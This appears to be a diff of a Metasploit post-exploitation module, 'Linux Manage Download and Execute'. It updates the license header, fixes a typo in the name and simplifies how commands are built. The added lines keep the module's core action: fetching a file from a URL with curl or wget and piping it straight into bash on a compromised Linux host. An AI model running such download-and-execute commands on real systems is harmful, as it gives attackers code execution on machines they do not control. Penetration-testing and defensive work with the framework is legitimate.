@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -15,7 +13,7 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-      'Name'          => 'Linux Manage Download and Exececute',
+      'Name'          => 'Linux Manage Download and Execute',
       'Description'   => %q{
           This module downloads and runs a file with bash. It first tries to uses curl as
         its HTTP client and then wget if it's not found. Bash found in the PATH is used to
@@ -47,7 +45,7 @@ class Metasploit3 < Msf::Post
   end
 
   def exists_exe?(exe)
-    path = expand_path(ENV['PATH'])
+    path = expand_path("$PATH")
     if path.nil? or path.empty?
       return false
     end
@@ -110,10 +108,10 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    if datastore['URL'].match(/https/)
-      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
+    if datastore['URL'].match(%r{^https://})
+      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     else
-      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
+      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
 
